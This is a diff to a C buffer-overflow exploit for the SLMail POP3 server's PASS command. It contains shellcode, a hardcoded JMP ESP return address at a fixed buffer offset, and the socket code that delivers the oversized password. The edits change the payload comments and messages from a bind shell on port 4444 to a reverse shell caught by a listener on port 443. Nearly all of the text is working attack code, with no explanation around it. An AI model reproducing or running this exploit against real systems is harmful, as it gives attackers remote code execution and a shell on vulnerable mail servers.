@@ -8,7 +8,7 @@ SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
 #include <winsock2.h>
 #include <windows.h>
 
-// [*] bind 4444 
+// Reverse shell payload  
 unsigned char shellcode[] = 
 "\xd9\xf7\xd9\x74\x24\xf4\x58\x33\xc9\xba\x15\x18\x8a\x1f\xb1"
 "\x52\x31\x50\x17\x83\xc0\x04\x03\x45\x0b\x68\xea\x99\xc3\xee"
@@ -54,7 +54,7 @@ void exploit(int sock) {
       memcpy(ptr, &shellcode, 317);
       *(long*)&evil[2606] = 0x5f4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP
       // \x8f\x35\x4a\x5f
-      // banner
+      // banner - should receive pop3 banner over 110 
       recv(sock, receive, 200, 0);
       printf("[+] %s", receive);
       // user
@@ -62,14 +62,14 @@ void exploit(int sock) {
       send(sock, userbuf, strlen(userbuf), 0);
       recv(sock, receive, 200, 0);
       printf("[+] %s", receive);
-      // passwd
+      // passwd - fuzzing stage
       printf("[+] Sending Evil buffer...\n");
       sprintf(buf, "PASS %s\r\n", evil);
       //test = fopen("test.txt", "w");
       //fprintf(test, "%s", buf);
       //fclose(test);
       send(sock, buf, strlen(buf), 0);
-      printf("[*] Done! Connect to the host on port 4444...\n\n");
+      printf("[*] Done! Check listener for reverse shell over port 443\n\n");
 }
 
 int connect_target(char *host, u_short port)
